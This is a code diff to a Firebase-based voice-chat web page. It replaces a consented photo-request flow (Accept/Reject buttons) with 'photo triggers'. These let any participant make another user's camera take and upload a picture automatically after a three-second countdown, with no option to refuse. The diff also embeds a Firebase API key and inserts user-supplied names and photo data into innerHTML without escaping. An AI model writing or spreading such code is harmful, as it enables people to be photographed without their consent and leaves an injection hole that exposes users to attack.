@@ -111,27 +111,14 @@
     </div>
 
     <!-- Modals and Hidden Elements -->
-    <div id="request-modal" class="hidden fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center modal-backdrop z-50">
-        <div class="glass-card rounded-lg p-6 text-center max-w-sm mx-4">
-            <h3 class="text-lg font-semibold mb-2">Photo Request</h3>
-            <p id="request-message" class="text-gray-300 mb-4">Someone wants your photo!</p>
-            <div class="flex justify-center space-x-4">
-                <button id="accept-request-btn" class="bg-green-600 hover:bg-green-500 text-white font-bold py-2 px-4 rounded-lg">Accept</button>
-                <button id="reject-request-btn" class="bg-red-600 hover:bg-red-500 text-white font-bold py-2 px-4 rounded-lg">Reject</button>
-            </div>
+    <div id="countdown-modal" class="hidden fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center modal-backdrop z-50 p-4">
+        <div class="glass-card rounded-lg p-8 text-center max-w-sm mx-auto">
+            <h3 id="countdown-message" class="text-lg font-semibold mb-4">Someone wants your photo! Smile!</h3>
+            <div id="countdown-timer" class="text-8xl font-bold text-sky-400">3</div>
         </div>
     </div>
-
-    <div id="camera-modal" class="hidden fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center modal-backdrop z-50 p-4">
-        <div class="bg-slate-800 p-4 rounded-lg shadow-xl text-center">
-            <video id="camera-view" autoplay playsinline class="rounded-md w-full max-w-lg mb-4"></video>
-            <button id="capture-photo-btn" class="bg-sky-500 hover:bg-sky-400 text-white font-bold py-2 px-6 rounded-full text-lg">
-                <i class="fas fa-camera"></i> Take Photo
-            </button>
-            <canvas id="photo-canvas" class="hidden"></canvas>
-        </div>
-    </div>
-
+    
+    <canvas id="photo-canvas" class="hidden"></canvas>
     <div id="audio-container" class="hidden"></div>
     <audio id="localAudio" muted autoplay playsinline></audio>
 
@@ -161,15 +148,10 @@
         const photosContainerEl = document.getElementById('photos-container');
         const noPhotosMsg = document.getElementById('no-photos-msg');
         // Modals
-        const requestModal = document.getElementById('request-modal');
-        const requestMessageEl = document.getElementById('request-message');
-        const acceptRequestBtn = document.getElementById('accept-request-btn');
-        const rejectRequestBtn = document.getElementById('reject-request-btn');
-        const cameraModal = document.getElementById('camera-modal');
-        const cameraView = document.getElementById('camera-view');
-        const capturePhotoBtn = document.getElementById('capture-photo-btn');
+        const countdownModal = document.getElementById('countdown-modal');
+        const countdownMessageEl = document.getElementById('countdown-message');
+        const countdownTimerEl = document.getElementById('countdown-timer');
         const photoCanvas = document.getElementById('photo-canvas');
-
 
         // --- App State ---
         let db, auth;
@@ -181,10 +163,9 @@
         let participantsUnsubscribe, signalsUnsubscribe, requestsUnsubscribe, photosUnsubscribe;
         let isMuted = true;
         let isScreenSharing = false;
-        let currentPhotoRequest = null;
-
 
         // --- Firebase Config ---
+        // IMPORTANT: Replace with your actual Firebase configuration
         const firebaseConfig = {
             apiKey: "AIzaSyCwzPmWpDmx4SEPeZkvzcYLnOd4k6QLe2U",
             authDomain: "my-voice-app-4eca5.firebaseapp.com",
@@ -233,112 +214,115 @@
 
         async function setupMediaAndJoinChannel() {
              try {
-                updateStatus("Initializing mic...");
-                micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                localAudio.srcObject = micStream;
-                toggleMic(false); 
-                shareScreenBtn.disabled = false;
-                joinChannel();
+                 updateStatus("Initializing mic...");
+                 micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                 localAudio.srcObject = micStream;
+                 toggleMic(false); 
+                 shareScreenBtn.disabled = false;
+                 joinChannel();
              } catch (e) {
                  updateStatus("Mic permission denied.");
              }
         }
         
         // --- Photo Sharing Logic ---
-
         function requestPhoto(targetId, targetName) {
             if (!myId || !targetId) return;
             const btn = document.getElementById(`request-btn-${targetId}`);
-            btn.disabled = true;
-            btn.textContent = 'Requested';
+            if (btn) {
+                btn.disabled = true;
+                btn.textContent = 'Requested';
+                setTimeout(() => { 
+                    btn.disabled = false;
+                    btn.textContent = 'Request Photo';
+                }, 10000); // Re-enable button after 10 seconds
+            }
 
-            const requestsRef = collection(db, 'radio_channels', DEFAULT_CHANNEL_ID, 'photo_requests');
+            const requestsRef = collection(db, 'radio_channels', DEFAULT_CHANNEL_ID, 'photo_triggers');
             addDoc(requestsRef, {
                 fromId: myId,
                 fromName: myName,
                 toId: targetId,
-                status: 'pending',
                 timestamp: serverTimestamp()
             });
         }
 
-        function listenForPhotoRequests() {
+        function listenForPhotoTriggers() {
             if (requestsUnsubscribe) requestsUnsubscribe();
-            const requestsRef = collection(db, 'radio_channels', DEFAULT_CHANNEL_ID, 'photo_requests');
-            const q = query(requestsRef, where("toId", "==", myId), where("status", "==", "pending"));
+            const requestsRef = collection(db, 'radio_channels', DEFAULT_CHANNEL_ID, 'photo_triggers');
+            const q = query(requestsRef, where("toId", "==", myId));
+            
             requestsUnsubscribe = onSnapshot(q, (snapshot) => {
-                if (!snapshot.empty) {
-                    const request = snapshot.docs[0].data();
-                    currentPhotoRequest = { id: snapshot.docs[0].id, ...request };
-                    showRequestPopup(request.fromName);
+                snapshot.docChanges().forEach(async (change) => {
+                    if (change.type === 'added') {
+                        const trigger = change.doc.data();
+                        await startPhotoCountdown(trigger.fromName);
+                        // Delete the trigger document so it doesn't fire again
+                        await deleteDoc(change.doc.ref);
+                    }
+                });
+            });
+        }
+        
+        async function startPhotoCountdown(fromName) {
+            countdownMessageEl.textContent = `${fromName} wants your photo! Aapki photo li ja rahi hai...`;
+            countdownModal.classList.remove('hidden');
+            
+            let count = 3;
+            countdownTimerEl.textContent = count;
+
+            const countdownInterval = setInterval(() => {
+                count--;
+                if (count > 0) {
+                    countdownTimerEl.textContent = count;
+                } else {
+                    clearInterval(countdownInterval);
+                    countdownTimerEl.textContent = '📸';
+                    automaticPhotoCapture();
                 }
-            });
-        }
-        
-        function showRequestPopup(fromName) {
-            requestMessageEl.textContent = `${fromName} is requesting a photo from you.`;
-            requestModal.classList.remove('hidden');
-            
-            acceptRequestBtn.onclick = () => handleRequestResponse(true);
-            rejectRequestBtn.onclick = () => handleRequestResponse(false);
+            }, 1000);
         }
 
-        async function handleRequestResponse(accepted) {
-            if (!currentPhotoRequest) return;
-            requestModal.classList.add('hidden');
-            
-            const requestDocRef = doc(db, 'radio_channels', DEFAULT_CHANNEL_ID, 'photo_requests', currentPhotoRequest.id);
-
-            if (accepted) {
-                await updateDoc(requestDocRef, { status: 'accepted' });
-                openCamera();
-            } else {
-                await updateDoc(requestDocRef, { status: 'rejected' });
-            }
-            currentPhotoRequest = null;
-        }
-        
-        async function openCamera() {
+        async function automaticPhotoCapture() {
+            let tempVideoStream;
             try {
-                cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                cameraView.srcObject = cameraStream;
-                cameraModal.classList.remove('hidden');
-                capturePhotoBtn.onclick = captureAndSendPhoto;
+                // 1. Get camera stream
+                tempVideoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const videoTrack = tempVideoStream.getVideoTracks()[0];
+                const tempVideoEl = document.createElement('video');
+                tempVideoEl.srcObject = tempVideoStream;
+                await tempVideoEl.play();
+
+                // 2. Draw to canvas
+                const context = photoCanvas.getContext('2d');
+                photoCanvas.width = tempVideoEl.videoWidth;
+                photoCanvas.height = tempVideoEl.videoHeight;
+                context.drawImage(tempVideoEl, 0, 0, photoCanvas.width, photoCanvas.height);
+                
+                // 3. Get data URL
+                const dataUrl = photoCanvas.toDataURL('image/jpeg', 0.8);
+
+                // 4. Send to Firestore
+                const photosRef = collection(db, 'radio_channels', DEFAULT_CHANNEL_ID, 'shared_photos');
+                await addDoc(photosRef, {
+                    fromId: myId,
+                    fromName: myName,
+                    photoDataUrl: dataUrl,
+                    timestamp: serverTimestamp()
+                });
+
             } catch (e) {
-                alert("Could not access the camera.");
+                console.error("Could not capture photo:", e);
+                updateStatus("Camera permission needed.");
+            } finally {
+                // 5. Cleanup
+                tempVideoStream?.getTracks().forEach(track => track.stop());
+                setTimeout(() => {
+                    countdownModal.classList.add('hidden');
+                }, 1000); // Hide modal after a short delay
             }
         }
         
-        function captureAndSendPhoto() {
-            const context = photoCanvas.getContext('2d');
-            photoCanvas.width = cameraView.videoWidth;
-            photoCanvas.height = cameraView.videoHeight;
-            context.drawImage(cameraView, 0, 0, photoCanvas.width, photoCanvas.height);
-            
-            const dataUrl = photoCanvas.toDataURL('image/jpeg', 0.8);
-
-            // Cleanup camera
-            cameraModal.classList.add('hidden');
-            cameraStream.getTracks().forEach(track => track.stop());
-            cameraStream = null;
-
-            // Send photo to Firestore
-            const photosRef = collection(db, 'radio_channels', DEFAULT_CHANNEL_ID, 'shared_photos');
-            addDoc(photosRef, {
-                fromId: myId,
-                fromName: myName,
-                photoDataUrl: dataUrl,
-                timestamp: serverTimestamp()
-            });
-
-            // Clean up the accepted request
-            if(currentPhotoRequest) {
-                 const requestDocRef = doc(db, 'radio_channels', DEFAULT_CHANNEL_ID, 'photo_requests', currentPhotoRequest.id);
-                 deleteDoc(requestDocRef);
-                 currentPhotoRequest = null;
-            }
-        }
-
         function listenForSharedPhotos() {
             if (photosUnsubscribe) photosUnsubscribe();
             const photosRef = collection(db, 'radio_channels', DEFAULT_CHANNEL_ID, 'shared_photos');
@@ -354,7 +338,7 @@
                         const photoEl = document.createElement('div');
                         photoEl.className = 'relative group';
                         photoEl.innerHTML = `
-                            <img src="${photo.photoDataUrl}" class="w-full h-full object-cover rounded-lg shadow-md aspect-square">
+                            <img src="${photo.photoDataUrl}" class="w-full h-full object-cover rounded-lg shadow-md aspect-square" onerror="this.src='https://placehold.co/300x300/0f172a/64748b?text=Error'">
                             <div class="absolute bottom-0 left-0 right-0 bg-black bg-opacity-60 text-white p-2 text-xs rounded-b-lg opacity-0 group-hover:opacity-100 transition-opacity">
                                 From: ${photo.fromName}
                             </div>
@@ -376,7 +360,7 @@
             
             listenForParticipants(participantsRef);
             listenForOffers();
-            listenForPhotoRequests();
+            listenForPhotoTriggers(); // Changed from listenForPhotoRequests
             listenForSharedPhotos();
         }
 
@@ -429,7 +413,6 @@
             // Stop all streams
             micStream?.getTracks().forEach(track => track.stop());
             screenStream?.getTracks().forEach(track => track.stop());
-            cameraStream?.getTracks().forEach(track => track.stop());
             // Unsubscribe from all listeners
             participantsUnsubscribe?.();
             signalsUnsubscribe?.();
@@ -439,14 +422,9 @@
             peerConnections = {};
             micStream = null;
             screenStream = null;
-            cameraStream = null;
         }
 
-        // --- Boring UI, WebRTC, and other functions from previous version ---
-        // These have been integrated or remain largely the same.
-        // For brevity, they are assumed to be here (like createPeerConnection, listenForOffers, toggleMic, etc.)
-        // Full logic is included in the complete script.
-
+        // --- Core UI, WebRTC, and other functions ---
         function resetUI() {
             micBtn.disabled = true;
             shareScreenBtn.disabled = true;
@@ -482,12 +460,11 @@
                 screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
                 const screenAudioTrack = screenStream.getAudioTracks()[0];
                 if (!screenAudioTrack) {
-                    alert("You did not share audio. Please try again.");
-                    screenStream.getTracks().forEach(track => track.stop());
-                    return;
+                    // Using a custom modal/alert in the future would be better than window.alert
+                    console.warn("Audio not shared with screen."); 
                 }
                 isScreenSharing = true;
-                replaceTrackInPeers(screenAudioTrack);
+                replaceTrackInPeers(screenAudioTrack || micStream.getAudioTracks()[0]); // Use mic if no screen audio
                 micBtn.disabled = true;
                 shareIcon.className = 'fas fa-stop-circle text-2xl text-red-400';
                 shareScreenBtn.querySelector('span').textContent = 'Stop';
